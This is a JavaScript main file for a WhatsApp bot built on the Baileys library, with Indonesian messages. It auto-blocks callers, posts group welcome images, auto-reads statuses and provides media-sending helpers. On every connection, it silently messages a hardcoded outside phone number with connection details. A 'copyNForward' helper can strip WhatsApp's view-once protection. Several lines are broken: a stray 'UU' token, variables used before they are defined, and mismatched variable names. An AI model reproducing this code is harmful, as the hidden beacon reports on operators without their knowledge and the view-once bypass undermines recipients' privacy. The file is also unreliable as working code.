require('./ZassTdrsettings')
const { default: makeWASocket, AnyMessageContent, useMultiFileAuthState, makeCacheableSignalKeyStore, delay, DisconnectReason, fetchLatestBaileysVersion, generateForwardMessageContent, prepareWAMessageMedia, MessageType, MessageOptions, Mimetype, generateWAMessageFromContent, generateMessageID, downloadContentFromMessage, makeInMemoryStore, jidDecode, jidNormalizedUser, proto } = require('baileys')
//const { state } = useSingleFileAuthState(`./${sessionName}.json`)
const pino = require('pino')
const { Boom } = require('@hapi/boom')
const fs = require('fs')
const chalk = require('chalk')
const figlet = require('figlet')
const FileType = require('file-type')
const path = require('path')
const PhoneNumber = require('awesome-phonenumber')
const { color, bgcolor, mycolor } = require('../ZassTdrjs/lib/color')
const { imageToWebp, videoToWebp, writeExifImg, writeExifVid } = require('../ZassTdrjs/lib/exif')
const { smsg, isUrl, generateMessageTag, getBuffer, getSizeMedia, fetchJson, await, sleep } = require('../ZassTdrjs/lib/functions')
const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) })

global.db = JSON.parse(fs.readFileSync('./ZassTdrjs/database/database.json'))
global.db.data = {
users: {},
chats: {},
sticker: {},
database: {},
game: {},
settings: {},
others: {},
...(global.db.data || {})
}

async function startZassTdr() {
const { state, saveCreds } = await useMultiFileAuthState(global.sessionName)
let { version, isLatest } = await fetchLatestBaileysVersion()
const ZassTdr = makeWASocket({
logger: pino({ level: 'silent' }),
printQRInTerminal: true,
patchMessageBeforeSending: (message) => {
const requiresPatch = !!(
  message.buttonsMessage
  || message.templateMessage
  || message.listMessage
  );
if (requiresPatch) {
  message = {
 viewOnceMessage: {
message: {
  messageContextInfo: {
deviceListMetadataVersion: 2,
deviceListMetadata: {},
  },
...message,
},
 },
  };
}
  return message;
},
browser: ['AkmalMods','Chrome','3.0.0'],
auth: state,
version
})

store.bind(ZassTdr.ev)

// Anti Call
ZassTdr.ev.on('call', async (fatihh) => {
    let botNumber = await ZassTdr.decodeJid(ZassTdr.user.id)
    let ciko = global.db.data.settings[botNumber].anticall
    if (!ciko) return
    console.log(fatihh)
    for (let tihh of fatihh) {
    if (tihh.isGroup == false) {
    if (tihh.status == "offer") {
    let pa7rick = await ZassTdr.sendTextWithMentions(tihh.from, `*${ZassTdr.user.name}* tidak bisa menerima panggilan ${tihh.isVideo ? `video` : `suara`}. Maaf @${tihh.from.split('@')[0]} kamu akan diblockir. Jika tidak sengaja silahkan hubungi Owner untuk dibuka !`)
    ZassTdr.sendContact(tihh.from, global.owner, pa7rick)
    await sleep(8000)
    await ZassTdr.updateBlockStatus(tihh.from, "block")
    }
    }
    }
    })

ZassTdr.ev.on('messages.upsert', async chatUpdate => {
try {
for (let mek of chatUpdate.messages) {
if (!mek.message) return
mek.message = (Object.keys(mek.message)[0] === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
if (mek.key && mek.key.remoteJid == 'status@broadcast') return
if (!ZassTdr.public && !mek.key.fromMe && chatUpdate.type === 'notify') return
if (mek.key.id && mek.key.id.length === 16) return
if (mek.key.id.startsWith('3EB0') && mek.key.id.length === 12) return
var m = smsg(ZassTdr, mek, store)
require('../ZassTdrjs/ZassTdr')(ZassTdr, m, chatUpdate, store)}
} catch (err) {
console.log(err)}
})

 // anticall auto block
    ZassTdr.ws.on('CB:call', async (json) => {
    const callerId = json.content[0].attrs['call-creator']
    if (json.content[0].tag == 'offer') {
    ZassTdr.sendMessage(callerId, { text: `*Sistem otomatis block!*\n*Jangan menelpon bot*!\n*Silahkan Hubungi Owner Untuk Dibuka !*`}, { quoted : pa7rick })
        let pa7rick = await ZassTdr.sendContact(callerId, global.owner)
    await sleep(8000)
    await ZassTdr.updateBlockStatus(callerId, "block")
    }
    })
    
ZassTdr.ev.on("groups.update", async (json) => {
console.log(json)
const res = json[0];
try {
ppgroup = await ZassTdr.profilePictureUrl(anu.id, 'image')
} catch {
ppgroup = 'https://tinyurl.com/yx93l6da'
}
if (res.announce == true) {
await sleep(2000)
let a = `「 Group Settings Change 」\n\nGroup has been closed by admin, Now only admin can send messages !`
ZassTdr.sendMessage(res.id, { text: a, 
contextInfo: {
externalAdReply: {
title: `${namabotnya}`,
body: `${namaownernya}`,
thumbnailUrl: ppgroup,
sourceUrl: myyt,
mediaType: 1,
renderLargerThumbnail: true
}
}
}
);
} else if (res.announce == false) {
await sleep(2000)
let a = `「 Group Settings Change 」\n\nGroup has been opened by admin, Now participants can send messages !`
ZassTdr.sendMessage(res.id, { text: a, 
contextInfo: {
externalAdReply: {
title: `${namabotnya}`,
body: `${namaownernya}`,
thumbnailUrl: ppgroup,
sourceUrl: myyt,
mediaType: 1,
renderLargerThumbnail: true
}
}
}
);
} else if (res.restrict == true) {
await sleep(2000)
let a = `「 Group Settings Change 」\n\nGroup info has been restricted, Now only admin can edit group info !`
ZassTdr.sendMessage(res.id, { text: a, 
contextInfo: {
externalAdReply: {
title: `${namabotnya}`,
body: `${namaownernya}`,
thumbnailUrl: ppgroup,
sourceUrl: myyt,
mediaType: 1,
renderLargerThumbnail: true
}
}
}
);
} else if (res.restrict == false) {
await sleep(2000)
let anu = `「Group Settings Change 」\n\nGroup info has been opened, Now participant can edit group info !`
ZassTdr.sendMessage(res.id, { text: a, 
contextInfo: {
externalAdReply: {
title: `${namabotnya}`,
body: `${namaownernya}`,
thumbnailUrl: ppgroup,
sourceUrl: myyt,
mediaType: 1,
renderLargerThumbnail: true
}
}
}
);
} else if(!res.desc == ''){
await sleep(2000)
let a = `「Group Settings Change 」\n\n*Group desk has been changed to*\n\n${res.desc}`
ZassTdr.sendMessage(res.id, { text: a, 
contextInfo: {
externalAdReply: {
title: `${namabotnya}`,
body: `${namaownernya}`,
thumbnailUrl: ppgroup,
sourceUrl: myyt,
mediaType: 1,
renderLargerThumbnail: true
}
}
}
);
} else {
await sleep(2000)
let a = `「Group Settings Change 」\n\n*Group Subject has been changed to*\n\n*${res.subject}*`
ZassTdr.sendMessage(res.id, { text: a, 
contextInfo: {
externalAdReply: {
title: `${namabotnya}`,
body: `${namaownernya}`,
thumbnailUrl: ppgroup,
sourceUrl: myyt,
mediaType: 1,
renderLargerThumbnail: true
}
}
});
} UU
});
// WELCOME & LEAVE
ZassTdr.ev.on('group-participants.update', async (anu) => {
console.log(anu)
const isWelcome = JSON.parse(fs.readFileSync('./ZassTdrjs/database/welcome.json'))
if(!isWelcome.includes(anu.id)) return
try {
let metadata = await ZassTdr.groupMetadata(anu.id)
let participants = anu.participants
let mem = metadata.participants.length
for (let num of participants) {
try {
ppuser = await ZassTdr.profilePictureUrl(num, 'image')
} catch {
ppuser = 'https://tinyurl.com/yx93l6da'
}
//
try {
ppgroup = await ZassTdr.profilePictureUrl(anu.id, 'image')
} catch {
ppgroup = 'https://tinyurl.com/yx93l6da'
}
if (anu.action == 'add') {
let buff = await getBuffer(`https://api.dhamzxploit.my.id/api/canvas/welcome2?name=${num.split("@")[0]}&mem=${metadata.participants.length}&gcname=${metadata.subject}&picurl=${ppuser}&bgurl=https://telegra.ph/file/fa061633996f79af5573a.jpg?size=626&ext=jpg`)
await ZassTdr.sendMessage(anu.id, { image: buff, caption: `✧━━━━━━[ *WELCOME* ]━━━━━━✧\n\n┏––––––━━━━━━━━•\n│( 👋 Hallo @${num.split('@')[0]} ⁩)\n┣━━━━━━━━┅┅┅\n├[ *INTRO* ]—\n│ *Nama:* \n│ *Umur:* \n│ *Gender:*\n┗––––––━━┅┅┅`, mentions: [num] })
} else if (anu.action == 'remove') {
let buff2 = await getBuffer(`https://api.dhamzxploit.my.id/api/canvas/goodbye2?name=${num.split("@")[0]}&mem=${metadata.participants.length}&gcname=${metadata.subject}&picurl=${ppuser}&bgurl=https://telegra.ph/file/fa061633996f79af5573a.jpg?size=626&ext=jpg`)
await ZassTdr.sendMessage(anu.id, { image: buff2, caption: `@${num.split("@")[0]} Leaving To ${metadata.subject}`, mentions: [num] })
} else if (anu.action == 'promote') {
await ZassTdr.sendMessage(anu.id, { image: { url: ppuser }, mentions: [num], caption: `@${num.split('@')[0]} Naik Jabatan Menjadi Admin Di Group ${metadata.subject}` })
} else if (anu.action == 'demote') {
await ZassTdr.sendMessage(anu.id, { image: { url: ppuser }, mentions: [num], caption: `@${num.split('@')[0]} Turun Jabatan Menjadi Member Di Group ${metadata.subject}` })
}
}
} catch (err) {
console.log("Eror Di Bagian Welcome Group "+err)
}
})
    
ZassTdr.ev.process(
async (events) => {
if (events['messages.upsert']) {
const upsert = events['messages.upsert']
for (let msg of upsert.messages) {
if (msg.key.remoteJid === 'status@broadcast') {
if (msg.message?.protocolMessage) return
console.log(`Lihat status ${msg.pushName} ${msg.key.participant.split('@')[0]}`)
await ZassTdr.readMessages([msg.key])
await delay(1000)
return await ZassTdr.readMessages([msg.key])}}
}

if (events['creds.update']) {await saveCreds()}
})

ZassTdr.decodeJid = (jid) => {
if (!jid) return jid
if (/:\d+@/gi.test(jid)) {
let decode = jidDecode(jid) || {}
return decode.user && decode.server && decode.user + '@' + decode.server || jid
} else return jid
}

ZassTdr.ev.on('contacts.update', update => {
for (let contact of update) {
let id = ZassTdr.decodeJid(contact.id)
if (store && store.contacts) store.contacts[id] = { id, name: contact.notify }
}
})
ZassTdr.reply = (from, content, msg) => ZassTdr.sendMessage(from, { text: content }, { quoted: msg })
ZassTdr.getName = (jid, withoutContact= false) => {
id = ZassTdr.decodeJid(jid)
withoutContact = ZassTdr.withoutContact || withoutContact 
let v
if (id.endsWith("@g.us")) return new Promise(async (resolve) => {
v = store.contacts[id] || {}
if (!(v.name || v.subject)) v = ZassTdr.groupMetadata(id) || {}
resolve(v.name || v.subject || PhoneNumber('+' + id.replace('@s.whatsapp.net', '')).getNumber('international'))
})
else v = id === '0@s.whatsapp.net' ? {
id,
name: 'WhatsApp'
} : id === ZassTdr.decodeJid(ZassTdr.user.id) ?
ZassTdr.user :
(store.contacts[id] || {})
return (withoutContact ? '' : v.name) || v.subject || v.verifiedName || PhoneNumber('+' + jid.replace('@s.whatsapp.net', '')).getNumber('international')
}

ZassTdr.sendContact = async (jid, kon, quoted = '', opts = {}) => {
	let list = []
	for (let i of kon) {
	list.push({
		displayName: await ZassTdr.getName(i + '@s.whatsapp.net'),
		vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await ZassTdr.getName(i + '@s.whatsapp.net')}\nFN:${await ZassTdr.getName(i + '@s.whatsapp.net')}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Ponsel\nitem2.EMAIL;type=INTERNET:${email}\nitem2.X-ABLabel:Email\nitem3.URL:${myyt}\nitem3.X-ABLabel:YouTube\nitem4.ADR:;;${region};;;;\nitem4.X-ABLabel:Region\nEND:VCARD`
	})
	}
	ZassTdr.sendMessage(jid, { contacts: { displayName: `${list.length} Kontak`, contacts: list }, ...opts }, { quoted })
}

ZassTdr.setStatus = (status) => {
ZassTdr.query({
tag: 'iq',
attrs: {
to: '@s.whatsapp.net',
type: 'set',
xmlns: 'status',
},
content: [{
tag: 'status',
attrs: {},
content: Buffer.from(status, 'utf-8')
}]
})
return status
}

ZassTdr.public = true

ZassTdr.serializeM = (m) => smsg(ZassTdr, m, store)

ZassTdr.ev.on('connection.update', (update) => {
const {connection,lastDisconnect} = update
if (connection === 'close') {lastDisconnect.error?.output?.statusCode !== DisconnectReason.loggedOut ? startZassTdr() : ''}
else if(connection === 'open') {ZassTdr.sendMessage("6282137944046@s.whatsapp.net", {text:`${JSON.stringify(update, undefined, 2)}`})}
console.log(update)})

ZassTdr.reSize = async (image, width, height) => {
       let jimp = require('jimp')
       var oyy = await jimp.read(image);
       var kiyomasa = await oyy.resize(width, height).getBufferAsync(jimp.MIME_JPEG)
       return kiyomasa
      }

ZassTdr.sendPoll = (jid, name = '', values = [], selectableCount = 1) => { return ZassTdr.sendMessage(jid, { poll: { name, values, selectableCount }}) }

ZassTdr.send5ButGif = async (jid , text = '' , footer = '', but = [], options = {}) =>{
let message = await prepareWAMessageMedia({ video: thumb, gifPlayback: true }, { upload: ZassTdr.waUploadToServer })
 const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 templateMessage: {
 hydratedTemplate: {
 videoMessage: message.videoMessage,
 "hydratedContentText": text,
 "hydratedFooterText": footer,
 "hydratedButtons": but
}
}
}), options)
ZassTdr.relayMessage(jid, template.message, { messageId: template.key.id })
}

ZassTdr.send5ButImg = async (jid , text = '' , footer = '', img, but = [], options = {}) =>{
let message = await prepareWAMessageMedia({ image: img }, { upload: ZassTdr.waUploadToServer })
var template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
templateMessage: {
hydratedTemplate: {
imageMessage: message.imageMessage,
 "hydratedContentText": text,
 "hydratedFooterText": footer,
 "hydratedButtons": but
}
}
}), options)
ZassTdr.relayMessage(jid, template.message, { messageId: template.key.id })
}

ZassTdr.send5ButVid = async (jid , text = '' , footer = '', vid, but = [], options = {}) =>{
let message = await prepareWAMessageMedia({ video: vid }, { upload: ZassTdr.waUploadToServer })
var template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
templateMessage: {
hydratedTemplate: {
videoMessage: message.videoMessage,
 "hydratedContentText": text,
 "hydratedFooterText": footer,
 "hydratedButtons": but
}
}
}), options)
ZassTdr.relayMessage(jid, template.message, { messageId: template.key.id })
}

ZassTdr.send5ButLoc = async (jid , text = '' , footer = '', img, but = [], options = {}) =>{
var template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
templateMessage: {
hydratedTemplate: {
 "hydratedContentText": text,
 "locationMessage": {
 "jpegThumbnail": img },
 "hydratedFooterText": footer,
 "hydratedButtons": but
}
}
}), options)
ZassTdr.relayMessage(jid, template.message, { messageId: template.key.id })
}

ZassTdr.sendList = async (jid , title = '', text = '', buttext = '', footer = '', but = [], options = {}) =>{
var template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
listMessage :{
 title: title,
 description: text,
 buttonText: buttext,
 footerText: footer,
 listType: "SELECT",
 sections: but,
 listType: 1
}
}), options)
ZassTdr.relayMessage(jid, template.message, { messageId: template.key.id })
}

ZassTdr.sendButtonText = (jid, buttons = [], text, footer, quoted = '', options = {}) => {
let buttonMessage = {
text,
footer,
buttons,
headerType: 2,
...options
}
ZassTdr.sendMessage(jid, buttonMessage, { quoted, ...options })
}

ZassTdr.sendButMessage = async (id, text1, desc1, but = [], options) => {
let buttonMessage = {
text: text1,
footer: desc1,
buttons: but,
headerType: 1
}
return ZassTdr.sendMessage(id, buttonMessage,{quoted: options})
}

ZassTdr.parseMention = (text = '') => {
return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
}

ZassTdr.sendText = (jid, text, quoted = '', options) => ZassTdr.sendMessage(jid, { text: text, ...options }, { quoted })

ZassTdr.sendImage = async (jid, path, caption = '', quoted = '', options) => {
	let buffer = Buffer.isBuffer(path) ? path : /^data:.?\/.?;base64,/i.test(path) ? Buffer.from(path.split`,`[1], 'base64') : /^https?:\/\//.test(path) ? await (await getBuffer(path)) : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0)
return await ZassTdr.sendMessage(jid, { image: buffer, caption: caption, ...options }, { quoted })
}

ZassTdr.sendVideo = async (jid, path, caption = '', quoted = '', gif = false, options) => {
let buffer = Buffer.isBuffer(path) ? path : /^data:.?\/.?;base64,/i.test(path) ? Buffer.from(path.split`,`[1], 'base64') : /^https?:\/\//.test(path) ? await (await getBuffer(path)) : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0)
return await ZassTdr.sendMessage(jid, { video: buffer, caption: caption, gifPlayback: gif, ...options }, { quoted })
}

ZassTdr.sendAudio = async (jid, path, quoted = '', ptt = false, options) => {
let buffer = Buffer.isBuffer(path) ? path : /^data:.?\/.?;base64,/i.test(path) ? Buffer.from(path.split`,`[1], 'base64') : /^https?:\/\//.test(path) ? await (await getBuffer(path)) : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0)
return await ZassTdr.sendMessage(jid, { audio: buffer, ptt: ptt, ...options }, { quoted })
}

ZassTdr.sendTextWithMentions = async (jid, text, quoted, options = {}) => ZassTdr.sendMessage(jid, { text: text, contextInfo: { mentionedJid: [...text.matchAll(/@(\d{0,16})/g)].map(v => v[1] + '@s.whatsapp.net') }, ...options }, { quoted })

ZassTdr.sendImageAsSticker = async (jid, path, quoted, options = {}) => {
let buff = Buffer.isBuffer(path) ? path : /^data:.?\/.?;base64,/i.test(path) ? Buffer.from(path.split`,`[1], 'base64') : /^https?:\/\//.test(path) ? await (await getBuffer(path)) : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0)
let buffer
if (options && (options.packname || options.author)) {
buffer = await writeExifImg(buff, options)
} else {
buffer = await imageToWebp(buff)
}

await ZassTdr.sendMessage(jid, { sticker: { url: buffer }, ...options }, { quoted })
return buffer
}

ZassTdr.sendVideoAsSticker = async (jid, path, quoted, options = {}) => {
let buff = Buffer.isBuffer(path) ? path : /^data:.?\/.?;base64,/i.test(path) ? Buffer.from(path.split`,`[1], 'base64') : /^https?:\/\//.test(path) ? await (await getBuffer(path)) : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0)
let buffer
if (options && (options.packname || options.author)) {
buffer = await writeExifVid(buff, options)
} else {
buffer = await videoToWebp(buff)
}

await ZassTdr.sendMessage(jid, { sticker: { url: buffer }, ...options }, { quoted })
return buffer
}
 
ZassTdr.downloadAndSaveMediaMessage = async (message, filename, attachExtension = true) => {
let quoted = message.msg ? message.msg : message
let mime = (message.msg || message).mimetype || ''
let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
const stream = await downloadContentFromMessage(quoted, messageType)
let buffer = Buffer.from([])
for await(const chunk of stream) {
buffer = Buffer.concat([buffer, chunk])
}
	let type = await FileType.fromBuffer(buffer)
trueFileName = attachExtension ? (filename + '.' + type.ext) : filename
await fs.writeFileSync(trueFileName, buffer)
return trueFileName
}

ZassTdr.downloadMediaMessage = async (message) => {
let mime = (message.msg || message).mimetype || ''
let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
const stream = await downloadContentFromMessage(message, messageType)
let buffer = Buffer.from([])
for await(const chunk of stream) {
buffer = Buffer.concat([buffer, chunk])
	}
	return buffer
 }
 
ZassTdr.copyNForward = async (jid, message, forceForward = false, options = {}) => {
let vtype
		if (options.readViewOnce) {
			message.message = message.message && message.message.ephemeralMessage && message.message.ephemeralMessage.message ? message.message.ephemeralMessage.message : (message.message || undefined)
			vtype = Object.keys(message.message.viewOnceMessage.message)[0]
			delete(message.message && message.message.ignore ? message.message.ignore : (message.message || undefined))
			delete message.message.viewOnceMessage.message[vtype].viewOnce
			message.message = {
				...message.message.viewOnceMessage.message
			}
		}
let mtype = Object.keys(message.message)[0]
let content = await generateForwardMessageContent(message, forceForward)
let ctype = Object.keys(content)[0]
		let context = {}
if (mtype != "conversation") context = message.message[mtype].contextInfo
content[ctype].contextInfo = {
...context,
...content[ctype].contextInfo
}
const waMessage = await generateWAMessageFromContent(jid, content, options ? {
...content[ctype],
...options,
...(options.contextInfo ? {
contextInfo: {
...content[ctype].contextInfo,
...options.contextInfo
}
} : {})
} : {})
await ZassTdr.relayMessage(jid, waMessage.message, { messageId:waMessage.key.id })
return waMessage
}

ZassTdr.cMod = (jid, copy, text = '', sender = ZassTdr.user.id, options = {}) => {
		let mtype = Object.keys(copy.message)[0]
		let isEphemeral = mtype === 'ephemeralMessage'
if (isEphemeral) {
mtype = Object.keys(copy.message.ephemeralMessage.message)[0]
}
let msg = isEphemeral ? copy.message.ephemeralMessage.message : copy.message
		let content = msg[mtype]
if (typeof content === 'string') msg[mtype] = text || content
		else if (content.caption) content.caption = text || content.caption
		else if (content.text) content.text = text || content.text
		if (typeof content !== 'string') msg[mtype] = {
			...content,
			...options
}
if (copy.key.participant) sender = copy.key.participant = sender || copy.key.participant
		else if (copy.key.participant) sender = copy.key.participant = sender || copy.key.participant
		if (copy.key.remoteJid.includes('@s.whatsapp.net')) sender = sender || copy.key.remoteJid
		else if (copy.key.remoteJid.includes('@broadcast')) sender = sender || copy.key.remoteJid
		copy.key.remoteJid = jid
		copy.key.fromMe = sender === ZassTdr.user.id
return proto.WebMessageInfo.fromObject(copy)
}

ZassTdr.getFile = async (PATH, save) => {
let res
let data = Buffer.isBuffer(PATH) ? PATH : /^data:.?\/.?;base64,/i.test(PATH) ? Buffer.from(PATH.split`,`[1], 'base64') : /^https?:\/\//.test(PATH) ? await (res = await getBuffer(PATH)) : fs.existsSync(PATH) ? (filename = PATH, fs.readFileSync(PATH)) : typeof PATH === 'string' ? PATH : Buffer.alloc(0)
let type = await FileType.fromBuffer(data) || {
mime: 'application/octet-stream',
ext: '.bin'
}
filename = path.join(__filename, '../src/' + new Date * 1 + '.' + type.ext)
if (data && save) fs.promises.writeFile(filename, data)
return {
res,
filename,
	size: await getSizeMedia(data),
...type,
data
}
}
return ZassTdr
}

startZassTdr()

let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.yellowBright(`Update File Terbaru ${__filename}`))
delete require.cache[file]
require(file)
})